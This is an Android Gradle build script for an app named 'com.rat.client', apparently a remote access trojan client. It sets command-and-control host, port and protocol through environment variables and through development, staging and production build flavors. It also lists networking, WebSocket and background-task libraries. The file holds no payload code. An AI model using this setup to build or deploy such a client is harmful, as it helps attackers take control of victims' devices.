plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("kotlin-kapt")
    id("kotlin-parcelize")
}

android {
    namespace = "com.rat.client"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.rat.client"
        minSdk = 24
        targetSdk = 34
        versionCode = 1
        versionName = "1.0.0"
        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
        vectorDrawables.useSupportLibrary = true

        // Multi-dex for large apps
        multiDexEnabled = true

        // Manifest placeholders for C2 configuration
        manifestPlaceholders["c2_host"] = System.getenv("C2_HOST") ?: "127.0.0.1"
        manifestPlaceholders["c2_port"] = System.getenv("C2_PORT") ?: "8080"
        manifestPlaceholders["c2_protocol"] = System.getenv("C2_PROTOCOL") ?: "http"
    }

    signingConfigs {
        getByName("debug") {
            storeFile = file("debug.keystore")
            storePassword = "android"
            keyAlias = "androiddebugkey"
            keyPassword = "android"
        }
        create("release") {
            storeFile = file("release.keystore")
            storePassword = System.getenv("KEYSTORE_PASSWORD") ?: "ratrelease"
            keyAlias = System.getenv("KEY_ALIAS") ?: "ratkey"
            keyPassword = System.getenv("KEY_PASSWORD") ?: "ratrelease"
        }
    }

    buildTypes {
        getByName("debug") {
            isDebuggable = true
            isMinifyEnabled = false
            isShrinkResources = false
            signingConfig = signingConfigs.getByName("debug")
            applicationIdSuffix = ".debug"
            versionNameSuffix = "-debug"
            matchingFallbacks.add("release")
        }
        getByName("release") {
            isDebuggable = false
            isMinifyEnabled = true
            isShrinkResources = true
            signingConfig = signingConfigs.getByName("release")
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_1_8
        targetCompatibility = JavaVersion.VERSION_1_8
    }

    kotlinOptions {
        jvmTarget = "1.8"
        freeCompilerArgs += listOf(
            "-Xopt-in=kotlin.RequiresOptIn",
            "-Xopt-in=kotlinx.coroutines.ExperimentalCoroutinesApi"
        )
    }

    buildFeatures {
        viewBinding = true
        dataBinding = true
        compose = false
        buildConfig = true
    }

    packaging {
        resources {
            excludes += listOf(
                "META-INF/DEPENDENCIES",
                "META-INF/LICENSE",
                "META-INF/LICENSE.txt",
                "META-INF/license.txt",
                "META-INF/NOTICE",
                "META-INF/NOTICE.txt",
                "META-INF/notice.txt",
                "META-INF/ASL2.0"
            )
        }
        jniLibs {
            useLegacyPackaging = true
        }
    }

    // Build variants for different C2 configurations
    flavorDimensions += "c2"
    productFlavors {
        create("development") {
            dimension = "c2"
            buildConfigField("String", "C2_HOST", "\"10.0.2.2\"")
            buildConfigField("int", "C2_PORT", "8080")
            buildConfigField("String", "C2_PROTOCOL", "\"http\"")
        }
        create("production") {
            dimension = "c2"
            buildConfigField("String", "C2_HOST", "\"${System.getenv("C2_HOST") ?: "c2.example.com"}\"")
            buildConfigField("int", "C2_PORT", "${System.getenv("C2_PORT") ?: "443"}")
            buildConfigField("String", "C2_PROTOCOL", "\"${System.getenv("C2_PROTOCOL") ?: "https"}\"")
        }
        create("staging") {
            dimension = "c2"
            buildConfigField("String", "C2_HOST", "\"staging-c2.example.com\"")
            buildConfigField("int", "C2_PORT", "8443")
            buildConfigField("String", "C2_PROTOCOL", "\"https\"")
        }
    }
}

dependencies {
    // Core Android
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.material:material:1.12.0")
    implementation("androidx.constraintlayout:constraintlayout:2.1.4")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.2")
    implementation("androidx.activity:activity-ktx:1.9.0")

    // Multi-dex
    implementation("androidx.multidex:multidex:2.0.1")

    // Coroutines and Flow
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.8.1")

    // Networking - OkHttp + Retrofit
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("com.squareup.okhttp3:logging-interceptor:4.12.0")
    implementation("com.squareup.retrofit2:retrofit:2.11.0")
    implementation("com.squareup.retrofit2:converter-gson:2.11.0")
    implementation("com.squareup.retrofit2:converter-scalars:2.11.0")
    implementation("com.squareup.retrofit2:adapter-rxjava3:2.11.0")

    // WebSocket
    implementation("com.github.nkzawa:socket.io-client:0.6.0")
    implementation("org.java-websocket:Java-WebSocket:1.5.4")

    // JSON serialization
    implementation("com.google.code.gson:gson:2.11.0")
    implementation("com.squareup.moshi:moshi:1.15.1")
    implementation("com.squareup.moshi:moshi-kotlin:1.15.1")
    kapt("com.squareup.moshi:moshi-kotlin-codegen:1.15.1")

    // Database - Room
    implementation("androidx.room:room-runtime:2.6.1")
    implementation("androidx.room:room-ktx:2.6.1")
    kapt("androidx.room:room-compiler:2.6.1")

    // Encryption
    implementation("androidx.security:security-crypto:1.1.0-alpha06")
    implementation("com.github.tony19:logback-android:3.0.0")

    // Image loading
    implementation("com.github.bumptech.glide:glide:4.16.0")
    kapt("com.github.bumptech.glide:compiler:4.16.0")

    // Permissions
    implementation("com.github.gabriellima:permissionsdispatcher:4.9.0")
    kapt("com.github.gabriellima:permissionsdispatcher-processor:4.9.0")

    // WorkManager for background tasks
    implementation("androidx.work:work-runtime-ktx:2.9.0")

    // Biometric
    implementation("androidx.biometric:biometric:1.2.0-alpha05")

    // Testing
    testImplementation("junit:junit:4.13.2")
    testImplementation("org.mockito:mockito-core:5.11.0")
    testImplementation("org.mockito.kotlin:mockito-kotlin:5.1.0")
    testImplementation("org.jetbrains.kotlinx:kotlinx-coroutines-test:1.8.1")
    androidTestImplementation("androidx.test.ext:junit:1.2.1")
    androidTestImplementation("androidx.test.espresso:espresso-core:3.6.1")
}